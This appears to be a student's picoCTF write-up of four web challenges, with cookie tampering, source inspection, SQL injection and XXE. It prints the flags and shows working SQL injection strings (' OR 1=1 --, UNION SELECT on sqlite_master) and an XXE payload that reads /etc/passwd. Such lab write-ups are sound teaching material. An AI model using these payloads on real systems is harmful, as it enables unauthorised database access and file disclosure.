| Category          | Challenges                                   | Status          |
|-|-|-|
| Web Exploitation           | 1. SOAP                                      | ![Done](https://img.shields.io/badge/Status-Done-brightgreen) |
|                             | 2. Cookies                                  | ![Done](https://img.shields.io/badge/Status-Done-brightgreen) |
|                             | 3. GET aHEAD                                | ![Not Done](https://img.shields.io/badge/Status-Not_Done-red)|
|                             | 4. Logon                                    | ![Done](https://img.shields.io/badge/Status-Done-brightgreen) |
|                             | 5. Insp3ct0r                                | ![Done](https://img.shields.io/badge/Status-Done-brightgreen) |
|                             | 6. Web Gauntlet                             | ![Not Done](https://img.shields.io/badge/Status-Not_Done-red)|
|                             | 7. Who are you?                             | ![Not Done](https://img.shields.io/badge/Status-Not_Done-red)|
|                             | 8. IntroToBurp                              | ![Not Done](https://img.shields.io/badge/Status-Not_Done-red) |
|                             | 9. More SQLi                                | ![Done](https://img.shields.io/badge/Status-Done-brightgreen) |
---

# Logon


**Flag**: `picoCTF{th3_c0nsp1r4cy_l1v3s_6edb3f5f}`

## Steps to Extract the Flag
1. Attempted to log in using the credentials `joe:joe` and clicked the **Sign In** button.
2. Successfully logged in, but it wasn't clear if I would be able to see the flag right away.

- Explored the **Developer Tools** to investigate further, specifically checking the **Applications > Cookies** section.
- Found a cookie named `admin` with a value set to `false`.
- Changed the value of the `admin` cookie to `true`, then refreshed the page.

After refreshing, the flag appeared

---

# Inspect3ctor

Flag: `picoCTF{tru3_d3t3ct1ve_0r_ju5t_lucky?2e7b23e3}`

## Steps to Extract the Flag

Upon inspecting the page source using `Ctrl + Shift + U` or `Inspect Element`, we find the flag in three parts:

- In the HTML: `<!-- Html is neat. Anyways have 1/3 of the flag: picoCTF{tru3_d3`
- In the JavaScript: `/* Javascript sure is neat. Anyways part 3/3 of the flag: _lucky?2e7b23e3} */`
- In the CSS: `/* You need CSS to make pretty pages. Here's part 2/3 of the flag: t3ct1ve_0r_ju5t */`


---


# More SQLi: Name

Flag: `picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}`

## Steps to Extract the Flag

Step 1: Bypass Authentication  
' OR 1=1 --  
This forces the SQL query to always return true, allowing access.

Step 2: Enumerate Table Names  
123' UNION SELECT name, sql, null FROM sqlite_master;--  
This revealed the existence of a table named `more_table`, which contains the flag.

Step 3: Extract the Flag  
123' UNION SELECT id, flag, null FROM more_table;--  
This displayed the flag stored in the `flag` column.

---

# Challenge: SOAP

**Flag:** ` picoCTF{XML_3xtern@l_3nt1t1ty_540f4f1e} `

## How you approached the challenge:

- We are tasked with finding the hidden file in /etc/passwd. A hint is given pointing to `XML external entity Injection`, also known as XXE attack.
- The only interactive elements on the website are 3 buttons ` Details `, we can normally exploite XXE vulnerability to  retrieve the /etc/passwd file by submitting the following XXE payload:
- Go to Dev Tools > Network Tab, I clicked on the first "Details" button
- Send a new request by adding a new XXE attack payload in the body and click on the response to get the flag
 
 ```
  <!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY example SYSTEM "/etc/passwd"> ]>
<data>&example;</data>

 ```

- Explanation of payload:
  1. <!DOCTYPE> allows us to define an external entity, in this case `&example`, foo is placeholder
  2. `[<!ENTITY example SYSTEM "/etc/passwd"> ]>`, gives example as the contents inside /etc/passwd
  3. The XXE payload defines an external entity, a placeholder `&example`, whose value is the contents of the /etc/passwd file. When the XML is read by the             program, it may automatically replace `&example`, with the actual data from that file. 
![image](https://github.com/user-attachments/assets/6a3dee48-850f-43dd-b887-30536dce69e8)

